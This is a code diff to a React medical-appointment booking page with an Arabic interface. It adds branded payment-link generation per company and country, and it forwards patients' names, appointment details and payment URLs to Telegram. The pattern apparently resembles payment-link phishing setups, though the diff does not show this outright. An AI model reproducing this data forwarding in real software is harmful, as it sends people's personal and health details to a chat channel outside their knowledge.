@@ -10,6 +10,21 @@ import { Country, getCountryByCode } from "@/lib/countries";
 import { ArrowRight, Heart, Shield, Clock, Award, Phone, MapPin, FileText } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { useCreateLink } from "@/hooks/useSupabase";
+import { sendToTelegram } from "@/lib/telegram";
+import { getBrandingByServiceType } from "@/lib/brandingSystem";
+import { generatePaymentLink } from "@/utils/paymentLinks";
+import TelegramTest from "@/components/TelegramTest";
+import { getCurrencyCode, getCurrencyName } from "@/lib/countryCurrencies";
+import {
+  AlertDialog,
+  AlertDialogAction,
+  AlertDialogContent,
+  AlertDialogDescription,
+  AlertDialogFooter,
+  AlertDialogHeader,
+  AlertDialogTitle,
+} from "@/components/ui/alert-dialog";
+import { Copy, ExternalLink } from "lucide-react";
 
 const HealthServices = () => {
   const { country } = useParams();
@@ -17,6 +32,11 @@ const HealthServices = () => {
   const { toast } = useToast();
   const selectedCountry = getCountryByCode(country || "");
   const createLink = useCreateLink();
+  const serviceBranding = getBrandingByServiceType('health');
+  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
+  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
+  const [linkId, setLinkId] = useState("");
+  const [copied, setCopied] = useState(false);
 
   const [bookingData, setBookingData] = useState({
     patientName: "",
@@ -96,13 +116,44 @@ const HealthServices = () => {
         payload: bookingPayload,
       });
 
-      toast({
-        title: "تم إرسال طلب الحجز بنجاح!",
-        description: "يمكنك مشاركة الرابط مع المريض",
+      // Generate payment URL
+      const paymentUrl = generatePaymentLink({
+        invoiceId: link.id,
+        company: "health",
+        country: country || 'SA'
       });
 
-      // Navigate to microsite
-      navigate(link.microsite_url);
+      // Send to Telegram
+      const telegramResult = await sendToTelegram({
+        type: 'payment_recipient',
+        data: {
+          patient_name: bookingData.patientName,
+          service_type: serviceTypes.find(s => s.value === bookingData.serviceType)?.label || '',
+          appointment_date: bookingData.appointmentDate,
+          appointment_time: bookingData.appointmentTime,
+          doctor_name: bookingData.doctorName,
+          country: selectedCountry.nameAr,
+          payment_url: `${window.location.origin}/r/${country}/health/${link.id}?company=health`
+        },
+        timestamp: new Date().toISOString(),
+      });
+
+      setCreatedPaymentUrl(paymentUrl);
+      setLinkId(link.id);
+      setShowSuccessDialog(true);
+
+      if (telegramResult.success) {
+        toast({
+          title: "تم إنشاء الحجز بنجاح!",
+          description: "تم إرسال البيانات إلى Telegram",
+        });
+      } else {
+        toast({
+          title: "تم إنشاء الحجز بنجاح!",
+          description: "لكن فشل الإرسال إلى Telegram",
+          variant: "destructive",
+        });
+      }
     } catch (error) {
       console.error("Error creating booking:", error);
     }
@@ -201,6 +252,26 @@ const HealthServices = () => {
               <Card className="p-6 mb-6">
                 <h2 className="text-lg font-bold mb-4">تفاصيل الموعد</h2>
                 <div className="grid md:grid-cols-2 gap-4">
+                  <div className="md:col-span-2">
+                    <Label htmlFor="serviceType">نوع الخدمة *</Label>
+                    <Select
+                      value={bookingData.serviceType}
+                      onValueChange={(value) =>
+                        setBookingData({ ...bookingData, serviceType: value })
+                      }
+                    >
+                      <SelectTrigger>
+                        <SelectValue placeholder="اختر نوع الخدمة..." />
+                      </SelectTrigger>
+                      <SelectContent>
+                        {serviceTypes.map((type) => (
+                          <SelectItem key={type.value} value={type.value}>
+                            {type.icon} {type.label}
+                          </SelectItem>
+                        ))}
+                      </SelectContent>
+                    </Select>
+                  </div>
                   <div>
                     <Label htmlFor="doctorName">الطبيب المفضل (اختياري)</Label>
                     <Input
@@ -248,12 +319,32 @@ const HealthServices = () => {
                       </SelectContent>
                     </Select>
                   </div>
+                  <div className="md:col-span-2">
+                    <Label htmlFor="notes">ملاحظات إضافية</Label>
+                    <Input
+                      id="notes"
+                      value={bookingData.notes}
+                      onChange={(e) =>
+                        setBookingData({ ...bookingData, notes: e.target.value })
+                      }
+                      placeholder="أي تفاصيل إضافية..."
+                    />
+                  </div>
                 </div>
               </Card>
 
-              <Button type="submit" size="lg" className="w-full">
+              <Button 
+                type="submit" 
+                size="lg" 
+                className="w-full"
+                style={{
+                  background: serviceBranding.gradients.primary,
+                  color: serviceBranding.colors.textOnPrimary
+                }}
+                disabled={createLink.isPending}
+              >
                 <FileText className="w-4 h-4 ml-2" />
-                حجز الموعد
+                {createLink.isPending ? "جاري الحجز..." : "حجز الموعد"}
               </Button>
             </form>
           </div>
@@ -363,7 +454,96 @@ const HealthServices = () => {
             </Card>
           </div>
         </div>
+
+        {/* Telegram Test */}
+        <div className="mt-6">
+          <TelegramTest />
+        </div>
       </div>
+
+      {/* Success Dialog */}
+      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
+        <AlertDialogContent className="max-w-md" dir="rtl">
+          <AlertDialogHeader>
+            <AlertDialogTitle className="text-xl text-center">✅ تم إنشاء الحجز بنجاح!</AlertDialogTitle>
+            <AlertDialogDescription className="text-center">
+              يمكنك نسخ الرابط أو معاينته قبل المتابعة
+            </AlertDialogDescription>
+          </AlertDialogHeader>
+
+          <div className="my-4">
+            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">المريض:</span>
+                <span className="font-semibold">{bookingData.patientName}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">نوع الخدمة:</span>
+                <span className="font-semibold">
+                  {serviceTypes.find(s => s.value === bookingData.serviceType)?.label}
+                </span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">التاريخ:</span>
+                <span className="font-semibold">{bookingData.appointmentDate}</span>
+              </div>
+              <div className="flex items-center justify-between text-sm">
+                <span className="text-muted-foreground">الوقت:</span>
+                <span className="font-semibold">{bookingData.appointmentTime}</span>
+              </div>
+            </div>
+
+            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
+              {createdPaymentUrl}
+            </div>
+
+            <div className="flex gap-2">
+              <Button
+                onClick={() => {
+                  navigator.clipboard.writeText(createdPaymentUrl);
+                  setCopied(true);
+                  setTimeout(() => setCopied(false), 2000);
+                  toast({ title: "تم النسخ!", description: "تم نسخ الرابط إلى الحافظة" });
+                }}
+                variant="outline"
+                className="flex-1"
+              >
+                {copied ? (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    تم النسخ!
+                  </>
+                ) : (
+                  <>
+                    <Copy className="w-4 h-4 ml-2" />
+                    نسخ الرابط
+                  </>
+                )}
+              </Button>
+
+              <Button
+                onClick={() => window.open(createdPaymentUrl, '_blank')}
+                variant="outline"
+                className="flex-1"
+              >
+                <ExternalLink className="w-4 h-4 ml-2" />
+                معاينة
+              </Button>
+            </div>
+          </div>
+
+          <AlertDialogFooter>
+            <AlertDialogAction
+              onClick={() => {
+                setShowSuccessDialog(false);
+                navigate(`/pay/${linkId}/recipient?company=health`);
+              }}
+            >
+              إدخال بيانات المريض
+            </AlertDialogAction>
+          </AlertDialogFooter>
+        </AlertDialogContent>
+      </AlertDialog>
     </div>
   );
 };
